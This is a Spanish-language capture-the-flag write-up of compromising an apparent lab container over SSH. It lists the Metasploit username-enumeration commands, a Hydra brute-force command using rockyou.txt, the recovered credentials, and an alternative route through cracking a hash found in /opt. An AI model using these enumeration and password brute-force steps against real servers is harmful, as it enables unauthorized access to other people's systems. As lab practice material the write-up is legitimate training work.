Fecha: 07/08/2024
Empiezo haciendo un scaneo completo a la máquina, y encuentro OpenSSH en el puerto 22.

![](Imágenes/Pasted%20image%2020240807004750.png)

Uso searchsploit para comprobar si hay alguna vulnerabilidad en esa versión, encontrando que hay la posiblidad de hacer 'Username Enumeration' . Intenté usar los scripts de searchsploit, pero no ví como usarlos, así que uso metasploit:

![](Imágenes/Pasted%20image%2020240807005624.png)

```
msfconsole 
```

![](Imágenes/Pasted%20image%2020240807011707.png)

Comandos usados:
```
search OpenSSH # podría haber concretado type:auxiliary ya que es info gather.
use 3 # Ya que el módulo que queremos usar tiene "id" 3
show options # Ver las opciones: interesa USER_FILE y RHOSTS, el puesto ya es 22
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt # Lista de posibles usuarios
set RHOSTS 172.17.0.2 
run
```


Vemos que el usuario "root" es accesible por ssh: 

![](Imágenes/Pasted%20image%2020240807013754.png)
Busco la contraseña hydra (resultado, `estrella`) y ya me conecto: 
```
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

![](Imágenes/Pasted%20image%2020240807013949.png)

### Viendo otros writeups, he visto que hay otra solución:
En vez de la lista unix_users de metasploit, uso /usr/share/wordlists/rockyou.txt:

Encuentro el usuario lovely, y uso hydra, obteniendo la contraseña `rockyou`:
![](Imágenes/Pasted%20image%2020240807012550.png)

Que resulta ser `rockyou`. Tras mirar en su homepath, no veo nada, miro en /opt y hay un hash, que crackeando en una página online (https://crackstation.net/) se traduce como "estrella" (la contraseña de su)

![](Imágenes/Pasted%20image%2020240807014453.png)
![](Imágenes/Pasted%20image%2020240807014641.png)
